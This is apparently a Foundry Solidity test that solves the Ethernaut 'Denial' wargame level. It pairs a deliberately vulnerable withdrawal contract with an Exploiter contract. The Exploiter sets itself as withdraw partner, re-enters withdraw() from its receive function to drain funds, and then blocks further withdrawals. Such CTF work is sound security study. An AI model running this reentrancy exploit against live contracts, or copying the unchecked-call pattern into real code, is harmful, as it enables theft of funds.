// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

contract DenialTest is Test {
    Denial denial;

    function setUp() public {
        denial = new Denial();
        deal(address(denial), 1e15);
        // denial = Denial(payable(0xc02F6DBd1C52461a15Af28E4982b491cd73C93f1));
    }

    function test() public {
        Exploiter exploiter = new Exploiter(address(denial));
        exploiter.setPartner();
        exploiter.exploit(10);
        exploiter.exploit(10);
        exploiter.exploit(10);
        exploiter.exploit(10);
        exploiter.exploit(10);
        exploiter.exploit(10);
        exploiter.exploit2(200, 30);
        uint256 gasBef = gasleft();
        vm.expectRevert();
        denial.withdraw();
        uint256 gasAft = gasleft();
        console2.log("Gas: ", gasBef - gasAft);
        console2.log(denial.contractBalance());
    }
}

contract Exploiter {
    IDenial public immutable denial;    

    uint256 public limit = 100;

    event Received(uint256 indexed value);
    event Exploited(uint256 indexed value);

    constructor(address _instance) {
        denial = IDenial(_instance);
    }

    function setPartner() external {
        denial.setWithdrawPartner(address(this));
    }

    function exploit(uint256 _times) external {
        uint256 i;
        while (i < _times) {
            _callContract();
            i++;
        }
    }

    function exploit2(uint256 _target, uint256 _limit) external {
        address(denial).call{value: _target - address(denial).balance}("");
        limit = _limit;
    }

    function _callContract() internal {
        if (address(denial).balance > limit) address(denial).call(abi.encodeWithSignature("withdraw()"));
    }

    receive() external payable {
        emit Received(msg.value);
        _callContract();
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}